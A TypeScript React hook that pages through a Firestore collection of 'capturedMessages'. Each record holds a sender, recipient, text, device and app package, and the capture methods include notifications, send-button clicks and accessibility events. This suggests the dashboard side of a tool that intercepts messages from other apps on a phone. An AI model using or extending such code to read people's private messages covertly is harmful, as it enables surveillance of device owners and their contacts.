'use client';

import { useState, useEffect, useCallback } from 'react';
import {
  db,
  collection,
  query,
  orderBy,
  onSnapshot,
  limit,
  startAfter,
  getDocs,
  QueryDocumentSnapshot,
  DocumentData,
} from '../lib/firebase-client';

export interface Message {
  id: string;
  app?: string;
  appName?: string;
  sender?: string;
  recipient?: string;
  content?: string;
  messageText?: string;
  text?: string;
  timestamp: Date;
  deviceId?: string;
  deviceName?: string;
  deviceModel?: string;
  userId?: string;
  read?: boolean;
  isSent?: boolean;
  messageType?: 'sent' | 'received';
  isGroup?: boolean;
  groupName?: string;
  packageName?: string;
  captureMethod?: 'notification' | 'send_button_click' | 'text_input_cleared' | 'accessibility_filtered' | 'accessibility';
  [key: string]: any;
}

interface UseMessagesResult {
  messages: Message[];
  loading: boolean;
  error: string | null;
  hasMore: boolean;
  loadMore: () => Promise<void>;
  refresh: () => Promise<void>;
  totalCount: number;
}

export function useItsYouMessages(
  isAuthenticated: boolean,
  pageSize: number = 100
): UseMessagesResult {
  const [messages, setMessages] = useState<Message[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [hasMore, setHasMore] = useState(true);
  const [lastDoc, setLastDoc] = useState<QueryDocumentSnapshot<DocumentData> | null>(null);
  const [totalCount, setTotalCount] = useState(0);

  // Load initial page
  const loadInitialPage = useCallback(async () => {
    if (!isAuthenticated) {
      setLoading(false);
      return;
    }

    try {
      setLoading(true);
      setError(null);

      console.log(`📥 Loading first ${pageSize} messages...`);

      const q = query(
        collection(db, 'capturedMessages'),
        orderBy('timestamp', 'desc'),
        limit(pageSize)
      );

      const snapshot = await getDocs(q);
      const messagesList: Message[] = [];

      snapshot.forEach((doc) => {
        try {
          const data = doc.data();
          const timestamp = data.timestamp?.toDate() || new Date();

          messagesList.push({
            id: doc.id,
            appName: data.appName || data.app,
            packageName: data.packageName,
            messageText: data.messageText,
            content: data.content,
            text: data.text,
            sender: data.sender,
            recipient: data.recipient,
            isSent: data.isSent || false,
            messageType: data.messageType || (data.isSent ? 'sent' : 'received'),
            timestamp,
            deviceId: data.deviceId,
            deviceName: data.deviceName,
            deviceModel: data.deviceModel,
            userId: data.userId,
            isGroup: data.isGroup || false,
            groupName: data.groupName,
            captureMethod: data.captureMethod,
            read: data.read,
            ...data,
          } as Message);
        } catch (error) {
          console.error('Error processing message document:', error);
        }
      });

      setMessages(messagesList);
      setLastDoc(snapshot.docs[snapshot.docs.length - 1] || null);
      setHasMore(snapshot.docs.length === pageSize);

      // Get total count (expensive, cache this)
      const countSnapshot = await getDocs(collection(db, 'capturedMessages'));
      setTotalCount(countSnapshot.size);

      console.log(`✅ Loaded ${messagesList.length} messages (Total: ${countSnapshot.size})`);
      setLoading(false);
    } catch (err: any) {
      console.error('❌ Error loading messages:', err);
      setError(err.message || 'Failed to load messages');
      setLoading(false);
    }
  }, [isAuthenticated, pageSize]);

  // Load more (pagination)
  const loadMore = useCallback(async () => {
    if (!isAuthenticated || !hasMore || !lastDoc || loading) {
      return;
    }

    try {
      setLoading(true);
      console.log(`📥 Loading next ${pageSize} messages...`);

      const q = query(
        collection(db, 'capturedMessages'),
        orderBy('timestamp', 'desc'),
        startAfter(lastDoc),
        limit(pageSize)
      );

      const snapshot = await getDocs(q);
      const newMessages: Message[] = [];

      snapshot.forEach((doc) => {
        try {
          const data = doc.data();
          const timestamp = data.timestamp?.toDate() || new Date();

          newMessages.push({
            id: doc.id,
            appName: data.appName || data.app,
            packageName: data.packageName,
            messageText: data.messageText,
            content: data.content,
            text: data.text,
            sender: data.sender,
            recipient: data.recipient,
            isSent: data.isSent || false,
            messageType: data.messageType || (data.isSent ? 'sent' : 'received'),
            timestamp,
            deviceId: data.deviceId,
            deviceName: data.deviceName,
            deviceModel: data.deviceModel,
            userId: data.userId,
            isGroup: data.isGroup || false,
            groupName: data.groupName,
            captureMethod: data.captureMethod,
            read: data.read,
            ...data,
          } as Message);
        } catch (error) {
          console.error('Error processing message document:', error);
        }
      });

      setMessages((prev) => [...prev, ...newMessages]);
      setLastDoc(snapshot.docs[snapshot.docs.length - 1] || null);
      setHasMore(snapshot.docs.length === pageSize);

      console.log(`✅ Loaded ${newMessages.length} more messages (Total loaded: ${messages.length + newMessages.length})`);
      setLoading(false);
    } catch (err: any) {
      console.error('❌ Error loading more messages:', err);
      setError(err.message || 'Failed to load more messages');
      setLoading(false);
    }
  }, [isAuthenticated, hasMore, lastDoc, loading, pageSize, messages.length]);

  // Refresh
  const refresh = useCallback(async () => {
    setMessages([]);
    setLastDoc(null);
    setHasMore(true);
    await loadInitialPage();
  }, [loadInitialPage]);

  // Load initial page on mount
  useEffect(() => {
    loadInitialPage();
  }, [loadInitialPage]);

  return {
    messages,
    loading,
    error,
    hasMore,
    loadMore,
    refresh,
    totalCount,
  };
}
